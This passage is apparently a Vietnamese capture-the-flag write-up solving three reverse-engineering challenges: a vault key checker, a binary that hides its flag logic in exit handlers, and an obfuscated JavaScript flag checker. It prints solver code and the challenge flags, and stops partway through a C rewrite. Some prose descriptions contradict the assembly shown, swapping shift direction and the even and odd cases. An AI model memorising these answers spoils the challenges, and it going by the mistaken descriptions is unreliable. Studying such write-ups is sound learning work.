Nhìn vào mã assembly, mảng chúng ta cần nhập vào phải chứa 0x20 kí tự và nhảy vào `loc_13CE`:

```c
.text:00000000000013CE loc_13CE:                               ; CODE XREF: main+2CD↓j
.text:00000000000013CE                 mov     eax, [rbp+var_2001D8]
.text:00000000000013D4                 cdqe
.text:00000000000013D6                 movzx   eax, byte ptr [rbp+rax+buf]
.text:00000000000013DE                 movsx   rdx, al
.text:00000000000013E2                 mov     eax, [rbp+var_2001D8]
.text:00000000000013E8                 cdqe
.text:00000000000013EA                 mov     [rbp+rax*8+var_2001D0], rdx
.text:00000000000013F2                 mov     eax, [rbp+var_2001D8]
.text:00000000000013F8                 cdqe
.text:00000000000013FA                 mov     rdx, [rbp+rax*8+var_2001D0]
.text:0000000000001402                 mov     eax, [rbp+var_2001D8]
.text:0000000000001408                 cdqe
.text:000000000000140A                 xor     rdx, rax
.text:000000000000140D                 mov     eax, [rbp+var_2001D8]
.text:0000000000001413                 cdqe
.text:0000000000001415                 mov     [rbp+rax*8+var_2001D0], rdx
.text:000000000000141D                 mov     eax, [rbp+var_2001D8]
.text:0000000000001423                 cdqe
.text:0000000000001425                 mov     rax, [rbp+rax*8+var_2001D0]
.text:000000000000142D                 shl     rax, 10h
.text:0000000000001431                 mov     rdx, rax
.text:0000000000001434                 mov     eax, [rbp+var_2001D8]
.text:000000000000143A                 cdqe
.text:000000000000143C                 mov     [rbp+rax*8+var_2001D0], rdx
.text:0000000000001444                 mov     eax, [rbp+var_2001D8]
.text:000000000000144A                 and     eax, 1
.text:000000000000144D                 test    eax, eax
.text:000000000000144F                 jz      short loc_147C
.text:0000000000001451                 mov     eax, [rbp+var_2001D8]
.text:0000000000001457                 cdqe
.text:0000000000001459                 mov     rax, [rbp+rax*8+var_2001D0]
.text:0000000000001461                 xor     rax, 2070h
.text:0000000000001467                 mov     rdx, rax
.text:000000000000146A                 mov     eax, [rbp+var_2001D8]
.text:0000000000001470                 cdqe
.text:0000000000001472                 mov     [rbp+rax*8+var_2001D0], rdx
.text:000000000000147A                 jmp     short loc_14A5

```

Dễ thấy ở `rbp+var_2001D8` chứa biến đếm, mình tạm đặt là `idx`, thực hiện 1 số phép toán đối với từng kí tự trong mảng mình nhập vào, ta thấy sau đó có chỉ thị sau:

Đầu tiên là xor từng kí tự với idx, sau đó dịch trái 0x10 `shl rax, 10h` -> val = (y ^ idx) >> 0x10

```c
.text:0000000000001444                 mov     eax, [rbp+var_2001D8]
.text:000000000000144A                 and     eax, 1
```

Chương kiểm tra `idx` là chẵn hay lẻ, nếu chẵn sẽ nhảy tới `loc_147c`, ngược lại thì sẽ tiếp tục

Nễu idx chẵn sẽ xor giá trị `val` bên trên với 0x2070, còn chẵn thì sẽ tới loc_147c và xor `val` với 0x7020:

```c
.text:000000000000147C loc_147C:                               ; CODE XREF: main+1E1↑j
.text:000000000000147C                 mov     eax, [rbp+var_2001D8]
.text:0000000000001482                 cdqe
.text:0000000000001484                 mov     rax, [rbp+rax*8+var_2001D0]
.text:000000000000148C                 xor     rax, 7020h
.text:0000000000001492                 mov     rdx, rax
.text:0000000000001495                 mov     eax, [rbp+var_2001D8]
.text:000000000000149B                 cdqe
.text:000000000000149D                 mov     [rbp+rax*8+var_2001D0], rdx
.text:00000000000014A5
```

Khái quát hóa:
   chẵn: ((y ^ idx) >> 0x10) ^ 0x7020
   lẽ  : ((y ^ idx) >> 0x10) ^ 0x2070
   
```c
.text:00000000000014A5 loc_14A5:                               ; CODE XREF: main+20C↑j
.text:00000000000014A5                 mov     eax, [rbp+var_2001D8]
.text:00000000000014AB                 cdqe
.text:00000000000014AD                 mov     rdx, [rbp+rax*8+var_2001D0]
.text:00000000000014B5                 mov     eax, [rbp+var_2001D8]
.text:00000000000014BB                 cdqe
.text:00000000000014BD                 xor     rdx, rax
.text:00000000000014C0                 mov     eax, [rbp+var_2001D8]
.text:00000000000014C6                 cdqe
.text:00000000000014C8                 mov     [rbp+rax*8+var_2001D0], rdx
.text:00000000000014D0                 mov     eax, [rbp+var_2001D8]
.text:00000000000014D6                 cdqe
.text:00000000000014D8                 mov     rdx, [rbp+rax*8+var_2001D0]
.text:00000000000014E0                 mov     eax, [rbp+var_2001D8]
.text:00000000000014E6                 cdqe
.text:00000000000014E8                 lea     rcx, ds:0[rax*8]
.text:00000000000014F0                 lea     rax, enc_flag     -> enc_flag array
.text:00000000000014F7                 mov     rax, [rcx+rax]
.text:00000000000014FB                 cmp     rdx, rax
.text:00000000000014FE                 jz      short loc_1519
.text:0000000000001500                 lea     rax, s          ; "Invalid vault key!"
.text:0000000000001507                 mov     rdi, rax        ; s
.text:000000000000150A                 call    _puts
.text:000000000000150F                 mov     edi, 1          ; status
.text:0000000000001514                 call    _exit
```

Cuối cùng chương trình sẽ lấy giá trị vừa được tính ở trên `xor` lại với idx và kiểm tra với từng kí tự tương ứng của mảng enc_flag trong chương trình.

`enc_flag`
```c
.rodata:0000000000002020                 public enc_flag
.rodata:0000000000002020 enc_flag        db  20h                 ; DATA XREF: main+282↑o
.rodata:0000000000002021                 db  70h ; p
.rodata:0000000000002022                 db  57h ; W
.rodata:0000000000002023                 db    0
.rodata:0000000000002024                 db    0
.rodata:0000000000002025                 db    0
.rodata:0000000000002026                 db    0
.rodata:0000000000002027                 db    0
.rodata:0000000000002028                 db  71h ; q
.rodata:0000000000002029                 db  20h
.rodata:000000000000202A                 db  30h ; 0
.rodata:000000000000202B                 db    0
.rodata:000000000000202C                 db    0
.rodata:000000000000202D                 db    0
.rodata:000000000000202E                 db    0
.rodata:000000000000202F                 db    0
.rodata:0000000000002030                 db  22h ; "
.rodata:0000000000002031                 db  70h ; p
.rodata:0000000000002032                 db  79h ; y
.rodata:0000000000002033                 db    0
.rodata:0000000000002034                 db    0
.rodata:0000000000002035                 db    0
.rodata:0000000000002036                 db    0
.rodata:0000000000002037                 db    0
.rodata:0000000000002038                 db  73h ; s
.rodata:0000000000002039                 db  20h
.rodata:000000000000203A                 db  61h ; a
.rodata:000000000000203B                 db    0
.rodata:000000000000203C                 db    0
.rodata:000000000000203D                 db    0
.rodata:000000000000203E                 db    0
.rodata:000000000000203F                 db    0
.rodata:0000000000002040                 db  24h ; $
.rodata:0000000000002041                 db  70h ; p
.rodata:0000000000002042                 db  35h ; 5
.rodata:0000000000002043                 db    0
.rodata:0000000000002044                 db    0
.rodata:0000000000002045                 db    0
.rodata:0000000000002046                 db    0
.rodata:0000000000002047                 db    0
.rodata:0000000000002048                 db  75h ; u
.rodata:0000000000002049                 db  20h
.rodata:000000000000204A                 db  71h ; q
.rodata:000000000000204B                 db    0
.rodata:000000000000204C                 db    0
.rodata:000000000000204D                 db    0
.rodata:000000000000204E                 db    0
.rodata:000000000000204F                 db    0
.rodata:0000000000002050                 db  26h ; &
.rodata:0000000000002051                 db  70h ; p
.rodata:0000000000002052                 db  59h ; Y
.rodata:0000000000002053                 db    0
.rodata:0000000000002054                 db    0
.rodata:0000000000002055                 db    0
.rodata:0000000000002056                 db    0
.rodata:0000000000002057                 db    0
.rodata:0000000000002058                 db  77h ; w
.rodata:0000000000002059                 db  20h
.rodata:000000000000205A                 db  37h ; 7
.rodata:000000000000205B                 db    0
.rodata:000000000000205C                 db    0
.rodata:000000000000205D                 db    0
.rodata:000000000000205E                 db    0
.rodata:000000000000205F                 db    0
.rodata:0000000000002060                 db  28h ; (
.rodata:0000000000002061                 db  70h ; p
.rodata:0000000000002062                 db  78h ; x
.rodata:0000000000002063                 db    0
.rodata:0000000000002064                 db    0
.rodata:0000000000002065                 db    0
.rodata:0000000000002066                 db    0
.rodata:0000000000002067                 db    0
.rodata:0000000000002068                 db  79h ; y
.rodata:0000000000002069                 db  20h
.rodata:000000000000206A                 db  3Ah ; :
.rodata:000000000000206B                 db    0
.rodata:000000000000206C                 db    0
.rodata:000000000000206D                 db    0
.rodata:000000000000206E                 db    0
.rodata:000000000000206F                 db    0
.rodata:0000000000002070                 db  2Ah ; *
.rodata:0000000000002071                 db  70h ; p
.rodata:0000000000002072                 db  78h ; x
.rodata:0000000000002073                 db    0
.rodata:0000000000002074                 db    0
.rodata:0000000000002075                 db    0
.rodata:0000000000002076                 db    0
.rodata:0000000000002077                 db    0
.rodata:0000000000002078                 db  7Bh ; {
.rodata:0000000000002079                 db  20h
.rodata:000000000000207A                 db  6Ah ; j
.rodata:000000000000207B                 db    0
.rodata:000000000000207C                 db    0
.rodata:000000000000207D                 db    0
.rodata:000000000000207E                 db    0
.rodata:000000000000207F                 db    0
.rodata:0000000000002080                 db  2Ch ; ,
.rodata:0000000000002081                 db  70h ; p
.rodata:0000000000002082                 db  78h ; x
.rodata:0000000000002083                 db    0
.rodata:0000000000002084                 db    0
.rodata:0000000000002085                 db    0
.rodata:0000000000002086                 db    0
.rodata:0000000000002087                 db    0
.rodata:0000000000002088                 db  7Dh ; }
.rodata:0000000000002089                 db  20h
.rodata:000000000000208A                 db  3Ch ; <
.rodata:000000000000208B                 db    0
.rodata:000000000000208C                 db    0
.rodata:000000000000208D                 db    0
.rodata:000000000000208E                 db    0
.rodata:000000000000208F                 db    0
.rodata:0000000000002090                 db  2Eh ; .
.rodata:0000000000002091                 db  70h ; p
.rodata:0000000000002092                 db  3Eh ; >
.rodata:0000000000002093                 db    0
.rodata:0000000000002094                 db    0
.rodata:0000000000002095                 db    0
.rodata:0000000000002096                 db    0
.rodata:0000000000002097                 db    0
.rodata:0000000000002098                 db  7Fh ; 
.rodata:0000000000002099                 db  20h
.rodata:000000000000209A                 db  61h ; a
.rodata:000000000000209B                 db    0
.rodata:000000000000209C                 db    0
.rodata:000000000000209D                 db    0
.rodata:000000000000209E                 db    0
.rodata:000000000000209F                 db    0
.rodata:00000000000020A0                 db  30h ; 0
.rodata:00000000000020A1                 db  70h ; p
.rodata:00000000000020A2                 db  4Fh ; O
.rodata:00000000000020A3                 db    0
.rodata:00000000000020A4                 db    0
.rodata:00000000000020A5                 db    0
.rodata:00000000000020A6                 db    0
.rodata:00000000000020A7                 db    0
.rodata:00000000000020A8                 db  61h ; a
.rodata:00000000000020A9                 db  20h
.rodata:00000000000020AA                 db  67h ; g
.rodata:00000000000020AB                 db    0
.rodata:00000000000020AC                 db    0
.rodata:00000000000020AD                 db    0
.rodata:00000000000020AE                 db    0
.rodata:00000000000020AF                 db    0
.rodata:00000000000020B0                 db  32h ; 2
.rodata:00000000000020B1                 db  70h ; p
.rodata:00000000000020B2                 db  73h ; s
.rodata:00000000000020B3                 db    0
.rodata:00000000000020B4                 db    0
.rodata:00000000000020B5                 db    0
.rodata:00000000000020B6                 db    0
.rodata:00000000000020B7                 db    0
.rodata:00000000000020B8                 db  63h ; c
.rodata:00000000000020B9                 db  20h
.rodata:00000000000020BA                 db  66h ; f
.rodata:00000000000020BB                 db    0
.rodata:00000000000020BC                 db    0
.rodata:00000000000020BD                 db    0
.rodata:00000000000020BE                 db    0
.rodata:00000000000020BF                 db    0
.rodata:00000000000020C0                 db  34h ; 4
.rodata:00000000000020C1                 db  70h ; p
.rodata:00000000000020C2                 db  78h ; x
.rodata:00000000000020C3                 db    0
.rodata:00000000000020C4                 db    0
.rodata:00000000000020C5                 db    0
.rodata:00000000000020C6                 db    0
.rodata:00000000000020C7                 db    0
.rodata:00000000000020C8                 db  65h ; e
.rodata:00000000000020C9                 db  20h
.rodata:00000000000020CA                 db  61h ; a
.rodata:00000000000020CB                 db    0
.rodata:00000000000020CC                 db    0
.rodata:00000000000020CD                 db    0
.rodata:00000000000020CE                 db    0
.rodata:00000000000020CF                 db    0
.rodata:00000000000020D0                 db  36h ; 6
.rodata:00000000000020D1                 db  70h ; p
.rodata:00000000000020D2                 db  49h ; I
.rodata:00000000000020D3                 db    0
.rodata:00000000000020D4                 db    0
.rodata:00000000000020D5                 db    0
.rodata:00000000000020D6                 db    0
.rodata:00000000000020D7                 db    0
.rodata:00000000000020D8                 db  67h ; g
.rodata:00000000000020D9                 db  20h
.rodata:00000000000020DA                 db  70h ; p
.rodata:00000000000020DB                 db    0
.rodata:00000000000020DC                 db    0
.rodata:00000000000020DD                 db    0
.rodata:00000000000020DE                 db    0
.rodata:00000000000020DF                 db    0
.rodata:00000000000020E0                 db  38h ; 8
.rodata:00000000000020E1                 db  70h ; p
.rodata:00000000000020E2                 db  77h ; w
.rodata:00000000000020E3                 db    0
.rodata:00000000000020E4                 db    0
.rodata:00000000000020E5                 db    0
.rodata:00000000000020E6                 db    0
.rodata:00000000000020E7                 db    0
.rodata:00000000000020E8                 db  69h ; i
.rodata:00000000000020E9                 db  20h
.rodata:00000000000020EA                 db  76h ; v
.rodata:00000000000020EB                 db    0
.rodata:00000000000020EC                 db    0
.rodata:00000000000020ED                 db    0
.rodata:00000000000020EE                 db    0
.rodata:00000000000020EF                 db    0
.rodata:00000000000020F0                 db  3Ah ; :
.rodata:00000000000020F1                 db  70h ; p
.rodata:00000000000020F2                 db  7Eh ; ~
.rodata:00000000000020F3                 db    0
.rodata:00000000000020F4                 db    0
.rodata:00000000000020F5                 db    0
.rodata:00000000000020F6                 db    0
.rodata:00000000000020F7                 db    0
.rodata:00000000000020F8                 db  6Bh ; k
.rodata:00000000000020F9                 db  20h
.rodata:00000000000020FA                 db  44h ; D
.rodata:00000000000020FB                 db    0
.rodata:00000000000020FC                 db    0
.rodata:00000000000020FD                 db    0
.rodata:00000000000020FE                 db    0
.rodata:00000000000020FF                 db    0
.rodata:0000000000002100                 db  3Ch ; <
.rodata:0000000000002101                 db  70h ; p
.rodata:0000000000002102                 db  76h ; v
.rodata:0000000000002103                 db    0
.rodata:0000000000002104                 db    0
.rodata:0000000000002105                 db    0
.rodata:0000000000002106                 db    0
.rodata:0000000000002107                 db    0
.rodata:0000000000002108                 db  6Dh ; m
.rodata:0000000000002109                 db  20h
.rodata:000000000000210A                 db  2Dh ; -
.rodata:000000000000210B                 db    0
.rodata:000000000000210C                 db    0
.rodata:000000000000210D                 db    0
.rodata:000000000000210E                 db    0
.rodata:000000000000210F                 db    0
.rodata:0000000000002110                 db  3Eh ; >
.rodata:0000000000002111                 db  70h ; p
.rodata:0000000000002112                 db  7Ch ; |
.rodata:0000000000002113                 db    0
.rodata:0000000000002114                 db    0
.rodata:0000000000002115                 db    0
.rodata:0000000000002116                 db    0
.rodata:0000000000002117                 db    0
.rodata:0000000000002118                 db  6Fh ; o
.rodata:0000000000002119                 db  20h
.rodata:000000000000211A                 db  62h ; b
.rodata:000000000000211B                 db    0
.rodata:000000000000211C                 db    0
.rodata:000000000000211D                 db    0
.rodata:000000000000211E                 db    0
.rodata:000000000000211F                 db    0  
```

Mọi thứ đã rõ ràng, dưới đây là script cho bài toán này:

[vault.py](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vault/vault.py)
```python
import base64

num = [0x577020,0x302071,0x797022,0x612073,0x357024,0x712075,0x597026,0x372077,0x787028,0x3a2079,0x78702a,0x6a207b,0x78702c,0x3c207d,0x3e702e,0x61207f,0x4f7030,0x672061,0x737032,0x662063,0x787034,0x612065,0x497036,0x702067,0x777038,0x762069,0x7e703a,0x44206b,0x76703c,0x2d206d,0x7c703e,0x62206f]

flag = []
idx = 0
for key in num:
    if idx % 2 == 0:
        for x in range(256):
            if (((((x ^ idx) << 0x10) ^ 0x7020) ^ idx) == key):
                flag.append(x)
                break
    else:
        for y in range(256):
            if (((((y ^ idx) << 0x10) ^ 0x2070) ^ idx) == key):
                flag.append(y)
                break
    idx += 1

print(''.join(chr(i) for i in flag))
```

-> `FLAG: W1{b1t_0p3rat10n_vault_good_j0b}`
### 3. wanna-one intels


`Description: Wait what? The intel is empty?????`

`Chall file:` [wanna-one-intels](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-intels/wanna-one-intels)


Vẫn là 1 file ELF 64bit (không bị stripped), nhưng lúc mình kiểm tra hàm main, thì nó chỉ thực hiện return ??
Vậy thì chương trình giấu số code còn lại ở đâu ????

```c
.text:0000000000401620 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000401620                 public main
.text:0000000000401620 main            proc near               ; DATA XREF: _start+18↓o
.text:0000000000401620 ; __unwind {
.text:0000000000401620                 endbr64
.text:0000000000401624                 xor     eax, eax
.text:0000000000401626                 retn
.text:0000000000401626 ; } // starts at 401620
.text:0000000000401626 main            endp
```

Ban đầu, mình thấy hơi hoang mang, và vì đây là file binary dùng `statically linked`, nên mình khá lười trong việc tìm xem hàm nào ẩn giấu trong IDA

Nên mình quyết định chạy file và có kết quả sau:

```c
╭─   ~/CTF/wannagame/chall                                                                                                                            12:19:58 ─╮
╰─❯ ./wanna-one-intels                                                                                                                                            ─╯
????? 
```

Ồ, mặc nhiên hàm `main` chỉ `xor eax, eax; ret` mà lại có thể in ra được các kí tự `đặc biệt` như này, mình lấy làm lạ.
Mình nghi ngờ là ở hàm `start` hoặc `exit` khi chương trình bắt đầu hoặc kết thúc có những đoạn code ẩn để in các kí tự này

Để chắc chắn, mình dùng `gdb` để debug và đặt `breakpoint` ở ret để kiểm tra

```
► 0x401626 <main+6>                        ret                                  <0x401b8a; __libc_start_call_main+106>
    ↓
   0x401b8a <__libc_start_call_main+106>    mov    edi, eax

```
Mình đã tới được `ret` và chưa có gì được in ra, mình lần theo hàm `exit` để xem thứ gì xảy ra. Và mình đã phát hiện được 1 thứ đặc biệt

```c
►  0x40a7f0 <__run_exit_handlers>       movabs rax, 0x101010101010101
   0x40a7fa <__run_exit_handlers+10>    push   rax
   0x40a7fb <__run_exit_handlers+11>    movabs rax, 0x1010b3e3e3e3e3e
   0x40a805 <__run_exit_handlers+21>    xor    qword ptr [rsp], rax
   0x40a809 <__run_exit_handlers+25>    mov    rsi, rsp
   0x40a80c <__run_exit_handlers+28>    push   1
   0x40a80e <__run_exit_handlers+30>    pop    rdi
   0x40a80f <__run_exit_handlers+31>    push   5
   0x40a811 <__run_exit_handlers+33>    pop    rdx
   0x40a812 <__run_exit_handlers+34>    push   1
   0x40a814 <__run_exit_handlers+36>    pop    rax
   0x40a815 <__run_exit_handlers+37>    syscall
```

Ở trong hàm `__run_exit_handlers` thật sự đã dùng các chỉ thị để in ra chuỗi kí tự `????`, mình tiếp tục theo hàm này để xem có chuyện gì xảy ra

-> Cuối cùng, mình thấy hàm dùng 1 vòng lặp để thực hiện các phép toán và cứ giảm stack cho đến khi đầy đủ kí tự flag và tiếp tục kiểm tra trên stack thì mình thấy các kí tự của flag, sau đó chương trình gọi syscall exit để kết thúc

```c
00:0000│ rsp 0x7fffffffdd00 ◂— 0x747375637b3157b0
01:0008│     0x7fffffffdd08 ◂— '0m_r0ut1n3s_w0w!}'
02:0010│     0x7fffffffdd10 ◂— 'n3s_w0w!}'
03:0018│     0x7fffffffdd18 ◂— 0x7d /* '}' */
04:0020│ rsi 0x7fffffffdd20 ◂— 0xa3f3f3f3f3f /* '?????\n' */

```

Việc bây giờ chỉ là lấy flag !
```c
pwndbg> search 'W1{'
Searching for value: 'W1{'
[stack]         0x7fffffffdd01 'W1{cust0m_r0ut1n3s_w0w!}'

```
-> `FLAG: W1{cust0m_r0ut1n3s_w0w!}`

### 4. Pu Pu flag checker

`Description: I thought it really easy.`

`Chall file:` [flagchecker.html](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/pupu-flag-checker/flagchecker.html)


```
Welcome to Pu Pu Flag checker
 
Input your flag, ex: W1{You_suck}     [Confirm]
```
-> Chương trình cho ta 1 file html, dường như là trang để check flag cổ điển, mình view source để xem chương trình chứa gì, thì thấy 1 dòng chứa những đoạn code có vẻ quen thuộc

```c
(function(_0x21262b,_0x48fc44){const _0x3d9bc6=_0x17ea,_0x1bc71f=_0x21262b();while(!![]){try{const _0x101b0c=parseInt(_0x3d9bc6(0x92))/0x1+parseInt(_0x3d9bc6(0x89))/0x2+-parseInt(_0x3d9bc6(0x8d))/0x3+-parseInt(_0x3d9bc6(0x87))/0x4*(-parseInt(_0x3d9bc6(0x8f))/0x5)+parseInt(_0x3d9bc6(0x94))/0x6+-parseInt(_0x3d9bc6(0x84))/0x7+parseInt(_0x3d9bc6(0x8e))/0x8*(parseInt(_0x3d9bc6(0x90))/0x9);if(_0x101b0c===_0x48fc44)break;else _0x1bc71f['push'](_0x1bc71f['shift']());}catch(_0x20c5ae){_0x1bc71f['push'](_0x1bc71f['shift']());}}}(_0x16be,0xedeb9));function getRandomInt(_0x35fac5,_0x501f88){const _0x4edb8c=_0x17ea;return Math[_0x4edb8c(0x8a)](Math[_0x4edb8c(0x96)]()*(_0x501f88-_0x35fac5+0x1))+_0x35fac5;}function byteArrayToBase64(_0x458f88){const _0x2bd1a7=_0x17ea;let _0x148301='';for(let _0x5a2524=0x0;_0x5a2524<_0x458f88[_0x2bd1a7(0x8b)];_0x5a2524++){_0x148301+=String[_0x2bd1a7(0x95)](_0x458f88[_0x5a2524]);}const _0x123abd=btoa(_0x148301);return _0x123abd;}function _0x17ea(_0x1ef9b6,_0x14509b){const _0x16be78=_0x16be();return _0x17ea=function(_0x17eabc,_0x5afbf3){_0x17eabc=_0x17eabc-0x84;let _0xe824bb=_0x16be78[_0x17eabc];return _0xe824bb;},_0x17ea(_0x1ef9b6,_0x14509b);}function xorStrings(_0x5601ff,_0x11ecad){const _0x403f41=_0x17ea;let _0x3822c6='';for(let _0x304d5b=0x0;_0x304d5b<_0x5601ff['length']&&_0x304d5b<_0x11ecad[_0x403f41(0x8b)];_0x304d5b++){const _0x1a8e54=_0x5601ff['charCodeAt'](_0x304d5b),_0x51cc58=_0x11ecad['charCodeAt'](_0x304d5b),_0x1d436b=_0x1a8e54^_0x51cc58;_0x3822c6+=String[_0x403f41(0x95)](_0x1d436b);}return _0x3822c6;}function check(_0x3b37a2){const _0x452468=_0x17ea;var _0x41bc91=[0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x1,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x4,0xc7,0x23,0xc3,0x18,0x96,0x5,0x9a,0x7,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x9,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x0,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x2,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0xc,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0xb,0xdb,0xe0,0x32,0x3a,0xa,0x49,0x6,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x8,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x3,0xf6,0xe,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0xd,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0xf,0xb0,0x54,0xbb,0x16];if(_0x3b37a2[_0x452468(0x8b)]!=0x2c)return alert('Incorrect\x20length!');var _0x2884dc=[];for(let _0x1a57d6=0x0;_0x1a57d6<_0x3b37a2[_0x452468(0x8b)];_0x1a57d6++){_0x2884dc[_0x452468(0x91)](_0x3b37a2[_0x452468(0x85)](_0x1a57d6));}for(let _0xfc20f8=0x0;_0xfc20f8<0x10;_0xfc20f8++){for(let _0x4fadbc=0x0;_0x4fadbc<_0x3b37a2[_0x452468(0x8b)];_0x4fadbc++){_0x2884dc[_0x4fadbc]=_0x41bc91[_0x2884dc[_0x4fadbc]];}}var _0x45d93e=byteArrayToBase64(_0x2884dc);console[_0x452468(0x86)](_0x45d93e);if(_0x45d93e!=_0x452468(0x88))return alert(_0x452468(0x93));return alert(_0x452468(0x8c));}function _0x16be(){const _0x4eae3d=['1923945aMREui','403288ARWAZc','522465dRWOJo','117AUdDXf','push','1266878gdaSSP','Incorrect\x20flag!','4091610cgcMNe','fromCharCode','random','9597917yhcHtu','charCodeAt','log','12qPopiU','/52NXNAD7Lui+5G7idT7Dbue0L7vkV/bDey779tzuwf7c5G7c5HbDZHswUs=','138664SkZbmA','floor','length','Good\x20job,\x20you\x27re\x20welcome!!'];_0x16be=function(){return _0x4eae3d;};return _0x16be();}
```

-> JavaScript Obfuscate

Vậy, mình tiến hành thả đoạn code trên vào tool [deobfuscate](https://deobfuscate.relative.im/) này để deobfuscate đoạn code trên.

Mình nhận được output như sau:

[pupu.js](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/pupu-flag-checker/pupu.js)
```javascript
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min
}
function byteArrayToBase64(data) {
  var value = ''
  var i = 0
  for (; i < data.length; i++) {
    value = value + String.fromCharCode(data[i])
  }
  var base64 = btoa(value)
  return base64
}
function xorStrings(data, key) {
  var output = ''
  var i = 0
  for (; i < data.length && i < key.length; i++) {
    var $116 = data.charCodeAt(i)
    var $y = key.charCodeAt(i)
    var $118 = $116 ^ $y
    output = output + String.fromCharCode($118)
  }
  return output
}
function check(result) {
  var window = [
    99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118,
    202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114,
    192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49,
    21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9,
    131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209,
    0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170,
    251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143,
    146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236,
    95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34,
    42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6,
    36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213,
    78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166,
    180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3,
    246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217,
    142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230,
    66, 104, 65, 153, 45, 15, 176, 84, 187, 22,
  ]
  if (result.length != 44) {
    return alert('Incorrect length!')
  }
  var options = []
  var key = 0
  for (; key < result.length; key++) {
    options.push(result.charCodeAt(key))
  }
  var _0xfc20f8 = 0
  for (; _0xfc20f8 < 16; _0xfc20f8++) {
    var i = 0
    for (; i < result.length; i++) {
      options[i] = window[options[i]]
    }
  }
  var value = byteArrayToBase64(options)
  console.log(value)
  if (value != '/52NXNAD7Lui+5G7idT7Dbue0L7vkV/bDey779tzuwf7c5G7c5HbDZHswUs=') {
    return alert('Incorrect flag!')
  }
  return alert("Good job, you're welcome!!")
}
```

Mọi thứ có vẻ đã rõ ràng hơn, tiến hành dịch ngược đoạn code trên 

Mình dành thời gian và nhờ tools để có thể viết lại đoạn code trên bằng code C sau để hiểu rõ hơn về nó (vì mình cũng không biết syntax trong js):

```c
#include <stdio.h>
#include <string.h>

char* bytetoa(unsigned char* byteArray, int length);
void xorStrings(char* string1, char* string2, char* result);
void check(char* inputString);

void xorStrings(char* string1, char* string2, char* result) {
    int i;
    int len = strlen(string1) < strlen(string2) ? strlen(string1) : strlen(string2);
    for (i = 0; i < len; i++) {
        result[i] = string1[i] ^ string2[i];
    }
    result[i] = '\0';
}

void check(char* inputString) {
    unsigned char xor[] = {
        [
    99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118,
    202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114,
    192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49,
    21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9,
    131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209,
    0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170,
    251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143,
